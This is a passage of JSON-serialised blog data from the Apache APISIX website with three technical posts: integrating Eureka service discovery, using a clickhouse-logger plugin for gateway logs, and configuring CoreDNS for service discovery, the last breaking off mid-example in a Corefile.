Eureka","metadata":{"permalink":"/blog/2022/03/05/apisix-integration-eureka-service-discovery","source":"@site/blog/2022/03/05/apisix-integration-eureka-service-discovery.md","title":"Integrate API Gateway with Eureka","description":"This article describes how to enable Eureka as a service discovery in the API gateway Apache APISIX and how to use diagnostic tools to find problems in the link.","date":"2022-03-05T00:00:00.000Z","formattedDate":"March 5, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.375,"truncated":true,"authors":[{"name":"Yong Qian","title":"Author","url":"https://github.com/nic-6443","image_url":"https://avatars.githubusercontent.com/u/22141303?v=4","imageURL":"https://avatars.githubusercontent.com/u/22141303?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"Biweekly Report (Mar 1st - Mar 14th)","permalink":"/blog/2022/03/24/weekly-report-0314"},"nextItem":{"title":"APISIX Integrates ClickHouse to Improve Log Efficiency","permalink":"/blog/2022/03/04/apigateway-clickhouse-makes-logging-easier"}},"content":"> This article describes how to enable Eureka as a service discovery in the API gateway Apache APISIX and how to use diagnostic tools to find problems in the link.\\n\\n\x3c!--truncate--\x3e\\nIn microservices architecture, large and complex systems are vertically divided into smaller subsystems based on function or business requirements, which exist as independently deployed sub-processes that communicate with each other through network calls. How these independently deployed services discover each other is the first problem to be solved, so there is often a centralized registry in microservice architectures.\\n\\nAs the most core development framework in the Java ecosystem, Spring continues to liberate the productivity of Java developers from Spring MVC to Spring Boot, and Spring Cloud is Spring\'s answer to the micro-service architecture in the Cloud native era.\\n\\nIn Spring Cloud, Eureka acts as a registry. Eureka is an open source Registry service written in the Java language by Netflix that plays a key role in Netflix\'s infrastructure.\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. As an industry-leading microservice gateway, Apache APISIX provides native support for Eureka. This article will use the Spring Cloud demo project as an example to show you the main functions and features of Apache APISIX docking Eureka service discovery.\\n\\n## Preparation Phase\\n\\nThis demonstration uses the official [`spring-cloud-netflix`](https://spring.io/projects/spring-cloud-netflix#overview) tutorial provided by Spring as an example, which provides the Eureka Server started with SpringBoot as the registration center of Spring Cloud. We also use the same method to start the Eureka server for demonstration. Please visit  [`spring-cloud-samples/eureka`](https://github.com/spring-cloud-samples/eureka\uff0c) for the project address.\\n\\nThe following will introduce you to the relevant code and startup method.\\n\\n## Eureka Server\\n\\nSpring Cloud provides an `EnableEurekaServer` annotation for Eureka, which can directly start an Eureka Server in the way of Spring Boot.\\n\\nThe code example is as follows:\\n\\n```Java\\n@SpringBootApplication\\n@EnableEurekaServer\\npublic class EurekaApplication {\\n        public static void main(String[] args) {\\n                SpringApplication.run(EurekaApplication.class,args);\\n        }\\n}\\n```\\n\\nThe startup method can directly refer to the following code:\\n\\n```Shell\\ngit clone git@github.com:spring-cloud-samples/eureka.git\\n# Execute in the project root directory\\n./gradlew bootRun\\n```\\n\\nThe `application.yml` file in the `resources` directory defines the Eureka Server listening on port `8761`.\\n\\n```YAML\\nserver:\\n  port: 8761\\n```\\n\\n### Access the HTTP Service of Eureka Client\\n\\nThe client annotation corresponding to `EnableEurekaServer` is `EnableEurekaClient`. Using `EnableEurekaClient` can easily register an HTTP application started with Spring Boot to Eureka.\\n\\nThe code example is as follows:\\n\\n```Java\\n@SpringBootApplication\\n@EnableEurekaClient\\n@RestController\\npublic class Application {\\n\\n        @Value(\\"${server.port}\\")\\n        int serverPort;\\n\\n        @RequestMapping(\\"/\\")\\n        public String home() {\\n                return String.format(\\"server-%s\\"\uff0cserverPort);\\n        }\\n\\n        public static void main(String[] args) {\\n                new SpringApplicationBuilder(Application.class).web(WebApplicationType.SERVLET).run(args);\\n        }\\n\\n}\\n```\\n\\nHere we expose an HTTP service on the `/` path and return the port currently used by Spring Boot, so that we can use different configuration files to start multiple instances to demonstrate the effect of APISIX on load balancing the list of server instances registered with Eureka.\\n\\nThe configuration file is as follows:\\n\\n```JAVA\\nspring.application.name=a-bootiful-client # will be used as the application name registered in Eureka\\nserver.port=8080 # Modify Modify the listening port to start multiple instances\\n```\\n\\nSet the listening ports to `8080`, `8081`, and `8082`, and start three Spring Boot instances. After completion, use a browser to access port `8761` of Eureka Server to view the results of service registration.\\n\\n![error/results example.png](https://static.apiseven.com/202108/1646350535070-7615a784-df05-4e94-a88e-b039c111de53.png)\\n\\nYou can see that three instances are registered under the application `A-BOOTIFUL-CLIENT`, exposing ports `8080`, `8081`, and `8082`, and they are all in the UP state.\\n\\n## Proxying SpringCloud Applications using APISIX\\n\\nNext, we will implement the request chain as shown in the following figure:\\n\\n![error/request link.png](https://static.apiseven.com/202108/1646350644536-7b68a4a3-b523-4c82-8e19-822624ff2c95.png)\\n\\n### Start Apache APISIX\\n\\nFirst, you need to find `apisix.discovery` in the configuration file `config.yaml` of Apache APISIX, modify the related configuration of Eureka Server connection information, and finally start APISIX.\\n\\n```YAML\\n  discovery:                       # service discovery center\\n      eureka:\\n        host:                        # it\'s possible to define multiple eureka hosts addresses of the same eureka cluster.\\n          - \\"http://172.23.79.129:8761\\" # Access address of Eureka Server started by Spring Boot\\n        prefix: /eureka/\\n        fetch_interval: 30           # default 30s\\n        weight: 100                  # default weight for node\\n        timeout:\\n          connect: 2000              # default 2000ms\\n          send: 2000                 # default 2000ms\\n          read: 5000                 # default 5000ms\\n\\n```\\n\\n### Create and Configure a Route\\n\\nCreate a Route and enable the Eureka Service Discovery plugin in Upstream.\\n\\n- `upstream.discovery_type` is `eureka`.\\n- `upstream.service_name` is the application name `A-BOOTIFUL-CLIENT` registered in Eureka.\\n\\n```Shell\\ncurl http://172.30.45.72:9180/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n    \\"uri\\": \\"/*\\"\uff0c\\n    \\"host\\": \\"eureka-demo\\",\\n    \\"upstream\\": {\\n        \\"service_name\\": \\"A-BOOTIFUL-CLIENT\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"discovery_type\\": \\"eureka\\"\\n    }\\n}\'\\n```\\n\\n### Request Routing\\n\\nUse the `curl` command to make multiple requests to verify the load balance effect.\\n\\n```Shell\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8081%\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8080%\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8082%\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8081%\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8080%\\n$ curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"\\nserver-8082%\\n```\\n\\nFrom the above returned results, you can see that requests are allocated to the three instances registered in Eureka in turn. This is because the load balancing algorithm we use is roundrobin, and all backend instances will be allocated requests in turn.\\n\\n### Simulate Instance Downtime\\n\\nStop the `8081` instance, simulate the downtime of the instance, and observe the effect of the request.\\n\\n```Shell\\n$ while true; do curl http://172.30.45.72:9080/ -H \\"Host: eureka-demo\\"; echo; sleep 1; done\\n\\nserver-8080\\nserver-8082\\nserver-8081\\n\\nserver-8080\\nserver-8082\\nserver-8081\\n\\nserver-8080\\nserver-8082\\n\\nserver-8080\\nserver-8082\\n```\\n\\nIt can be seen from the above results that after closing the `8081` instance, Apache APISIX will synchronize to the latest instance list of Eureka in time, and then forward the request to the correct backend.\\n\\n### Diagnostic Tools\\n\\nIn microservice systems, unexpected forwarding problems are often encountered. The reasons for these problems may come from various links in service discovery, such as: client registration exception, registration center data exception, gateway reading registration data exception, etc., diagnostic tools that can be used in the link when an anomaly occurs will be particularly important.\\n\\nTherefore, APISIX provides a diagnostic interface in the Service Discovery plugin, which can easily query the list of services currently being used by the gateway. Combined with the console of the registry, we can quickly diagnose the link from the gateway to the registry.\\n\\nThe diagnostic interface is exposed on port `9090` of the loopback interface by default, and the access method is `GET /v1/discovery/{discovery_type}/dump`, for example:\\n\\n```Shell\\ncurl http://localhost:9090/v1/discovery/eureka/dump\\n\\n{\\n  \\"services\\": {\\n    \\"A-BOOTIFUL-CLIENT\\": [\\n      {\\n        \\"weight\\": 100,\\n        \\"metadata\\": {\\n          \\"management.port\\": \\"8081\\"\\n        },\\n        \\"host\\": \\"192.168.50.164\\",\\n        \\"port\\": 8081\\n      },\\n      {\\n        \\"weight\\": 100,\\n        \\"metadata\\": {\\n          \\"management.port\\": \\"8080\\"\\n        },\\n        \\"host\\": \\"192.168.50.164\\",\\n        \\"port\\": 8080\\n      },\\n      {\\n        \\"weight\\": 100,\\n        \\"metadata\\": {\\n          \\"management.port\\": \\"8082\\"\\n        },\\n        \\"host\\": \\"192.168.50.164\\",\\n        \\"port\\": 8082\\n      }\\n    ]\\n  },\\n  \\"config\\": {\\n    \\"prefix\\": \\"\\\\/eureka\\\\/\\",\\n    \\"timeout\\": {\\n      \\"connect\\": 2000,\\n      \\"send\\": 2000,\\n      \\"read\\": 5000\\n    },\\n    \\"fetch_interval\\": 30,\\n    \\"host\\": [\\n      \\"http:\\\\/\\\\/172.23.79.129:8761\\"\\n    ],\\n    \\"weight\\": 100\\n  }\\n}\\n```\\n\\nIn this way, the Eureka data that APISIX is using is queried.\\n\\n## Summary\\n\\nSpring Cloud is a popular microservice framework, and Apache APISIX provides the ability to handle Spring Cloud application traffic by supporting Eureka Service Discovery. We can see that the close integration of these two ecosystems makes the implementation of the microservice architecture change. It is simpler and more efficient, so that business development can focus more on business value.\\n\\nFor more instructions and complete configuration information about the `eureka` plugin, please refer to the [Apache APISIX official documentation](https://apisix.apache.org/docs/apisix/discovery/eureka/).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/docs/general/join) to communicate."},{"id":"APISIX Integrates ClickHouse to Improve Log Efficiency","metadata":{"permalink":"/blog/2022/03/04/apigateway-clickhouse-makes-logging-easier","source":"@site/blog/2022/03/04/apigateway-clickhouse-makes-logging-easier.md","title":"APISIX Integrates ClickHouse to Improve Log Efficiency","description":"This article describes how Zhendong Qi contributed `clickhouse-logger` to API gateway Apache APISIX, and how to use this plugin to simplify business architecture.","date":"2022-03-04T00:00:00.000Z","formattedDate":"March 4, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.615,"truncated":true,"authors":[{"name":"Zhendong Qi","title":"Author","url":"https://github.com/zhendongcmss","image_url":"https://github.com/zhendongcmss.png","imageURL":"https://github.com/zhendongcmss.png"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://github.com/yzeng25.png","imageURL":"https://github.com/yzeng25.png"}],"prevItem":{"title":"Integrate API Gateway with Eureka","permalink":"/blog/2022/03/05/apisix-integration-eureka-service-discovery"},"nextItem":{"title":"Apache APISIX with CoreDNS enrich service discovery","permalink":"/blog/2022/03/04/apisix-uses-coredns-enable-service-discovery"}},"content":"> The author of this article, Zhendong Qi, is from China Mobile Cloud Competence Center. He has extensive experience in distributed object storage software development and has participated in the construction of several resource pools in the mobile cloud. This article describes how community contributor Zhendong Qi contributed `clickhouse-logger` to Apache APISIX and how he used the plugin to simplify the business architecture and improve the efficiency of logging.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. It not only has many useful plugins, but also supports plugin dynamic change and hot reload.\\n\\nDeveloped by Yandex and open sourced in 2016, ClickHouse is not only a database, but also a database management system that allows creating tables and databases, loading data and running queries at runtime without reconfiguring or restarting services.\\n\\nAs more and more companies start to migrate their business to the cloud, how to efficiently implement log sending and receiving and log analysis to enhance the observabilities of the system becomes a challenge. China Mobile Cloud Competence Center, as a company providing public cloud services, the architecture of the initial Apache APISIX-based business log sending and receiving and analysis system is roughly like this.\\n\\n![initial bussiness architecture](https://static.apiseven.com/202108/1646363723740-f92d6a39-64e0-4464-8c44-c73832362bf6.png)\\n\\nAs the business grows, the above solution is not only oddly expensive to maintain, but also difficult to meet our needs for fine-grained data analysis. Since the data received by rsyslog is a string rather than a JSON format log, it makes log analysis difficult.\\n\\nThere is a famous saying in computing that \\"any problem can be solved by adding an indirect middle layer\\". We actually considered adding another intermediate layer between `tcp-logger` and rsyslog to convert strings to JSON, but this is obviously not a permanent solution.\\n\\nSo let\'s look at the problem differently: if we consider the existing architecture of \\"tcp-logger+rsyslog+Promtail+Loki\\" as a huge middle layer, then no matter how many additional middle layers we add in between, it only solves the immediate problem. In the meantime, it makes it more bloated and difficult to maintain. Is there a product on the market that can directly replace \\"tcp-logger+rsyslog+Promtail+Loki\\"?\\n\\nWith this question in mind, we spent some time researching and ended up choosing ClickHouse for several reasons.\\n\\n1. ClickHouse provides HTTP interface for easy calling of other modules.\\n2. ClickHouse-based analysis toolbox is very mature and can meet our needs for log analysis.\\n3. ClickHouse supports the use of object storage as a storage engine, very convenient.\\n4. There is no need to repeat the \\"tool-building\\" process.\\n\\nThere is only one problem left to solve: how to implement the interface between Apache APISIX and ClickHouse? A good way to do this is in the form of a plugin. As a member of the Apache APISIX community, I rarely speak up in the community. Seeing the recent progress in the ecosystem of Apache APISIX, I was actually a bit excited to use Apache APISIX, but I haven\'t contributed any code to the community yet, so I thought I\'d like to take this opportunity to add some fire to the community\'s ecosystem development.\\n\\n## How It Works\\n\\nThe `clickhouse-logger` plugin acts as an middle layer between Apache APISIX and ClickHouse. As mentioned above, we use Apache APISIX as a seven-layer load balancer and requests passing through Apache APISIX generate logs, such as access log and error log. The `clickhouse-logger` collects the logs and organizes them according to the log format set by its own metadata. Finally, it relies on a batch processor to send the collated logs to ClickHouse in bulk.\\n\\n![clickhouse-logger architecture](https://static.apiseven.com/202108/1646363936994-c2646095-1ea4-4c1f-8cad-1dcecfc41df3.png)\\n\\n`clickhouse-logger` serves as a replacement for \\"tcp-logger+rsyslog+Promtail+Loki\\" in our scenario. Eliminating the need for format conversion and data forwarding between multiple components, log data requests can be pushed directly to the ClickHouse server.\\n\\n![improved bussiness architecture](https://static.apiseven.com/202108/1646364005040-93d70286-e7e6-4fb5-a164-1de1c865ce2b.png)\\n\\n## How to Use the ClickHouse Plugin\\n\\nHere is a sample process to enable the `clickhouse-logger` plugin in a route.\\n\\n### Enable the ClickHouse Plugin\\n\\nRun the `curl` command to enable the `clickhouse-logger` plugin for the specified route.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n      \\"plugins\\": {\\n            \\"clickhouse-logger\\": {\\n                \\"user\\": \\"default\\",\\n                \\"password\\": \\"a\\",\\n                \\"database\\": \\"default\\",\\n                \\"logtable\\": \\"test\\",\\n                \\"endpoint_addr\\": \\"http://127.0.0.1:8123\\"\\n            }\\n       },\\n      \\"upstream\\": {\\n           \\"type\\": \\"roundrobin\\",\\n           \\"nodes\\": {\\n               \\"127.0.0.1:1980\\": 1\\n           }\\n      },\\n      \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\nThe parameters of clickhouse-logger are listed in the chart below.\\n\\n|Name|Type|Required|Default Value|Range|Description|\\n|----|----|--------|------------|-----|-----------|\\n|endpoint_addr|string|Yes|n/a|n/a|ClickHouse server endpoint.|\\n|database|string|Yes|n/a|n/a|The database used.|\\n|logtable|string|Yes|n/a|n/a|The name of the table to write to.|\\n|user|string|Yes|n/a|n/a|User for ClickHouse.|\\n|password|string|Yes|n/a||Password for ClickHouse.|\\n|timeout|integer|No|3|[1,...]|The time to keep the connection active after sending the request.|\\n|name|string|No|\\"clickhouse-logger\\"|n/a|A unique identifier that identifies the logger.|\\n|batch_max_size|integer|No|100|[1,...]|Set the maximum number of logs to be sent each time, and when the maximum number of logs reaches the set value, all logs will be automatically pushed to `clickhouse`.|\\n|max_retry_count|integer|No|0|[0,...]|Maximum number of retries before being removed from the processing pipeline.|\\n|retry_delay|integer|No|1|[0,...]|If the execution fails, the execution of the process should be delayed for a number of seconds.|\\n|ssl_verify|boolean|No|true|[true,false]|Validate the certificate.|\\n\\n### Test the ClickHouse Plugin\\n\\n1. Use the `curl` command to test the plugin.\\n  \\n  ```shell\\n  curl -i http://127.0.0.1:9080/hello\\n  ```\\n\\n2. If the following result is returned, it means it is successfully enabled.\\n\\n  ```shell\\n  HTTP/1.1 200 OK\\n  ...\\n  hello, world\\n  ```\\n\\n### Advanced Skill: Configure Log Format\\n\\nYou can set a custom log format using the `log_format` metadata, as shown in the example below.\\n\\n1. Configure the `log_format` metadata parameter.\\n\\n  ```shell\\n  curl http://127.0.0.1:9080/apisix/admin/plugin_metadata/clickhouse-logger \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"log_format\\": {\\n          \\"host\\": \\"$host\\",\\n          \\"@timestamp\\": \\"$time_iso8601\\",\\n          \\"client_ip\\": \\"$remote_addr\\"\\n      }\\n  }\'\\n  ```\\n\\n  > Declare the log format as a key-value pair in JSON format. For the value part, only strings are supported. If it starts with`$`, it indicates that it is to get [APISIX built-in variables](https://apisix.apache.org/docs/apisix/apisix-variable) or [Nginx built-in variables](http://nginx.org/en/docs/varindex.html). In particular, **this setting is global**, meaning that specifying `log_format` will take effect on all routes or services bound to `http-logger`.\\n\\n2. Create a table for ClickHouse to write in.\\n\\n  ```sql\\n  CREATE TABLE default.test (\\n    `host` String,\\n    `client_ip` String,\\n    `route_id` String,\\n    `@timestamp` String,\\n    PRIMARY KEY(`@timestamp`)\\n  ) ENGINE = MergeTree()\\n  ```\\n\\n3. Execute `select * from default.test;` on ClickHouse, you will get data similar to the following.\\n\\n  ```shell\\n  \u250c\u2500host\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500client_ip\u2500\u252c\u2500route_id\u2500\u252c\u2500@timestamp\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n  \u2502 127.0.0.1 \u2502 127.0.0.1 \u2502    1     \u2502 2022-01-17T10:03:10+08:00 \u2502\\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n  ```\\n\\n### Advanced Skill: Connect Grafana with ClickHouse\\n\\n1. Enable the clickhouse-logger plugin globally.\\n\\n  ```shell\\n  curl http://127.0.0.1:9080/apisix/admin/global_rules/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"plugins\\": {\\n          \\"clickhouse-logger\\": {\\n              \\"timeout\\": 3,\\n              \\"retry_delay\\": 1,\\n              \\"batch_max_size\\": 100,\\n              \\"user\\": \\"default\\",\\n              \\"password\\": \\"a\\",\\n              \\"database\\": \\"default\\",\\n              \\"logtable\\": \\"t\\",  \\"max_retry_count\\": 1,\\n              \\"endpoint_addr\\": \\"http://127.0.0.1:8123\\"\\n          }\\n      }\\n  }\'\\n  ```\\n\\n2. Configure the log_format metadata parameter. log_format must be in the same format as the database table structure, otherwise it will cause write failure.\\n\\n  ```shell\\n   curl http://127.0.0.1:9080/apisix/admin/plugin_metadata/clickhouse-logger \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"log_format\\": {\\n          \\"upstream_header_time\\": \\"$upstream_header_time\\",\\n          \\"upstream_connect_time\\": \\"$upstream_connect_time\\",\\n          \\"status\\": \\"$status\\",\\n          \\"host\\": \\"$host\\",\\n          \\"body_bytes_sent\\": \\"$body_bytes_sent\\",\\n          \\"request\\": \\"$request\\",\\n          \\"remote_user\\": \\"$remote_user\\",\\n          \\"client_ip\\": \\"$remote_addr\\",\\n          \\"content_length\\": \\"$content_length\\",\\n          \\"local_time\\": \\"$fmt_ms_time_local\\",\\n          \\"http_referer\\": \\"$http_referer\\",\\n          \\"http_x_amz_target\\": \\"$http_x_amz_target\\",\\n          \\"http_x_request_id\\": \\"$http_x_request_id\\",\\n          \\"upstream_response_time\\": \\"$upstream_response_time\\",\\n          \\"upstream_status\\": \\"$upstream_status\\",\\n          \\"http_user_agent\\": \\"$http_user_agent\\",\\n          \\"request_time\\": \\"$request_time\\",\\n          \\"upstream_addr\\": \\"$upstream_addr\\",\\n          \\"http_host\\": \\"$http_host\\",\\n          \\"content_type\\": \\"$content_type\\"\\n      }\\n  }\'\\n  ```\\n\\nHere are some screenshots of the dashboard after interfacing with Clickhouse using Grafana.\\n\\n![Grafana-1](https://static.apiseven.com/202108/1646366781343-ab2848fe-d10a-4222-a90d-79f4fe58999a.png)\\n\\n![Grafana-2](https://static.apiseven.com/202108/1646366807867-4391a9ff-8b71-411c-8353-38957a5a2da1.png)\\n\\n![Grafana-3](https://static.apiseven.com/202108/1646366832282-e8f24c63-c914-4051-8239-582bc3e58f50.png)\\n\\n### Disable the ClickHouse Plugin\\n\\n`clickhouse-logger` can be disabled by removing the appropriate configuration in the plugin configuration. Since the Apache APISIX plugin is hot-loaded, the configuration can be updated without a restart.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nThe above is the whole process of developing `clickhouse-logger` for Apache APISIX, and how to implement it with Grafana to achieve the same observability with simpler architechure and worlflows. I hope more people in the community will be willing to step out of their comfort zones, switching from followers to contributors is much easier than you think."},{"id":"Apache APISIX with CoreDNS enrich service discovery","metadata":{"permalink":"/blog/2022/03/04/apisix-uses-coredns-enable-service-discovery","source":"@site/blog/2022/03/04/apisix-uses-coredns-enable-service-discovery.md","title":"Apache APISIX with CoreDNS enrich service discovery","description":"The cloud-native API Gateway Apache APISIX integrates multiple service discovery capabilities. This article will show you how to configure CoreDNS in APISIX.","date":"2022-03-04T00:00:00.000Z","formattedDate":"March 4, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.89,"truncated":true,"authors":[{"name":"Zijie Chen","title":"Author","url":"https://github.com/CP3cham","image_url":"https://avatars.githubusercontent.com/u/87352162?v=4","imageURL":"https://avatars.githubusercontent.com/u/87352162?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"APISIX Integrates ClickHouse to Improve Log Efficiency","permalink":"/blog/2022/03/04/apigateway-clickhouse-makes-logging-easier"},"nextItem":{"title":"How to Use Gitpod to Develop API Gateway?","permalink":"/blog/2022/03/03/develop-apisix-with-gitpod"}},"content":"> Apache APISIX is a dynamic, real-time, high-performance cloud-native API gateway that provides rich traffic management functions such as load balancing, dynamic upstream, grayscale publishing, service interruption, identity authentication, and observability. As a cloud native API gateway, Apache APISIX also integrates multiple service discovery capabilities. This article will show you how to configure CoreDNS in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background information\\n\\nIn traditional physical machine and virtual machine deployment, calls between various services can be made through fixed **IP + port**. With the advent of the cloud-native era, enterprise business deployment is more inclined to cloud-native containerization. However, in a containerized environment, the startup and destruction of service instances are very frequent. Manual maintenance by operation and maintenance personnel will not only be a heavy workload, but also ineffective. Therefore, a mechanism is needed that can automatically detect the service status, and dynamically bind a new address when the service address changes. The service discovery mechanism came into being.\\n\\n## Service Discovery\\n\\nThe service discovery mechanism can be split into two parts:\\n\\n- Service Registry: Store host and port information for services.\\n\\nIf a container provides a service for calculating the average, we use the service name of average as the unique identifier, then it will be stored in the form of a key-value pair (average:192.168.1.21) in the service registry.\\n\\n- Service Discovery: Allows other users to discover the information stored during the service registration phase. It is divided into client discovery mode and server discovery mode.\\n\\n### Client Service Discovery Mode\\n\\nWhen using the client discovery mode, the client obtains the actual network address of the available service by querying the storage information of the service registry, selects an available service instance through a load balancing algorithm, and sends the request to the service.\\n\\n- Advantages: Simple architecture, flexible expansion, and easy implementation of load balancing functions.\\n- Disadvantages: heavy client, strong coupling, there is a certain development cost.\\n\\n![error/client service discovery.png](https://static.apiseven.com/202108/1646299277491-53bd8cd0-a984-4fed-bcbd-d251c18f5b7f.png)\\n\\nThe implementation logic of client discovery mode is as follows:\\n\\n1. When a new service is started, it will actively register with the registration center, and the service registration center will store the service name and address of the new service;\\n2. When the client needs this service, it will use the service name to initiate a query to the service registry;\\n3. The service registry returns the available addresses, and the client selects one of the addresses to initiate the call according to the specific algorithm.\\n\\nIn this process, in addition to service registration, the work of service discovery is basically completed by the client independently, and the addresses of the registry and the server are also fully visible to the client.\\n\\n### Server Service Discovery Mode\\n\\nThe client sends a request to the Load Balancer, and the Load Balancer queries the service registry according to the client\'s request, finds an available service, and forwards the request to the service. Like the client service discovery mode, the service needs to be registered and deregistered in the registry.\\n\\n- Advantages: The discovery logic of the service is transparent to the client.\\n- Disadvantages: Requires additional deployment and maintenance of a Load Balancer.\\n\\n![error/server service discovery.png](https://static.apiseven.com/202108/1646299327406-0172de7f-94a8-4964-b109-562795941d0e.png)\\n\\nThe implementation logic of server discovery mode is as follows:\\n\\n1. When a new service is started, it will actively register with the registry, and the service registry will store the service name and address of the new service;\\n2. When the client needs a service, it will use the service name to initiate a query to the load balancer;\\n3. According to the service name requested by the client, the Load Balancer proxies the client to initiate a request to the service registry;\\n4. After the Load Balancer obtains the returned address, it selects one of the addresses to initiate the call according to the specific algorithm.\\n\\n## Advantages of using CoreDNS\\n\\nCoreDNS is an open source DNS server written in `Go`, which is commonly used for DNS services and service discovery in multi-container environments due to its flexibility and extensibility. CoreDNS is built on top of Caddy, the HTTP/2 web server, and implements a plug-in chain architecture, abstracting many DNS related logic into layer-by-layer plug-ins, which are more flexible and easy to expand, and user selected plugin It will be compiled into the final executable file, and the running efficiency is also very high. CoreDNS is the first cloud native open source project to join CNCF (Cloud Native Computing Foundation) and has graduated, and it is also the default DNS service in Kubernetes.\\n\\nCompared with common service discovery frameworks (Apache ZooKeeper and Consul), what are the advantages of CoreDNS implementing service discovery?\\n\\nThe principle of service discovery is similar to DNS domain name system, which is an important infrastructure in computer networks. The DNS domain name system binds domain names that rarely change with frequently changing server IP addresses, while the service discovery mechanism is to seldom change domain names. The service name is bound to the service address. In this way, we can use DNS to achieve a function similar to the service registry, and only need to convert the domain name stored in the DNS into the service name. Since many computers have built in DNS functions, we only need to modify the configuration on the original DNS system without doing too many extra things.\\n\\n## Principle Architecture\\n\\nThe overall structure is as follows:\\n\\n1. The client initiates a request to APISIX to call the service.\\n2. APISIX accesses the upstream service node according to the set route (the specific configuration can be seen below). In APISIX, you can set the upstream information to obtain through DNS. As long as the IP address of the DNS server is set correctly, APISIX will automatically initiate a request to this address , to obtain the address of the corresponding service in DNS.\\n3. CoreDNS returns a list of available addresses based on the requested service name.\\n4. APISIX selects one of the available addresses and the configured algorithm to initiate the call.\\n\\n![error/architecture.png](https://static.apiseven.com/202108/1646299394984-76683b2c-03ae-45b0-b5a6-8b8f3b6d47cf.png)\\n\\n## How to Use\\n\\n### Prerequisites\\n\\nThis article is based on the following environments.\\n\\n- OS: Centos 7.9.\\n- Apache APISIX 2.12.1, please refer to: [How-to-Bulid Apache APISIX](https://apisix.apache.org/docs/apisix/how-to-build).\\n- CoreDNS 1.9.0\uff0cplease refer to: [CoreDNS Installation Guide](https://coredns.io/manual/toc/#installation).\\n- Node.js, please refer to: [Node.js Installation](https://github.com/nodejs/help/wiki/Installation).\\n\\n### Procedure\\n\\n1. Use Node.js\'s `Koa` framework starts a simple test service on port `3005`.\\n\\nAccessing this service will return the string `Hello World`, and we will get the address of this service via CoreDNS later.\\n\\n```Shell\\n  const Koa = require(\'koa\');\\n  const app = new Koa();\\n\\n  app.use(async ctx => {\\n    ctx.body = \'Hello World\';\\n  });\\n\\n  app.listen(3005);\\n```\\n\\n2. Configure CoreDNS.\\n\\nCoreDNS listens on port `53` by default, and will read the `Corefile` configuration file in the same directory. Under the initial conditions, there is no `Corefile` file in the same directory, so we need to create and complete the configuration.\\n\\n`Corefile` mainly implements functions by configuring plugins, so we need to configure three plugins:\\n\\n- `hosts`: You can use this parameter to bind the service name and IP address. Fallthrough means that when the current plugin cannot return normal data, the request can be forwarded to the next plugin for processing (if it exists).\\n- `forward`: Indicates to proxy the request to the specified address, usually the authoritative DNS server address.\\n- `log`: Don\'t configure any parameters to print log information to the console interface for debugging.\\n\\n```Shell\\n  .:1053 {                           # Listen on port 1053\\n      hosts {\\n          10.10.10.10 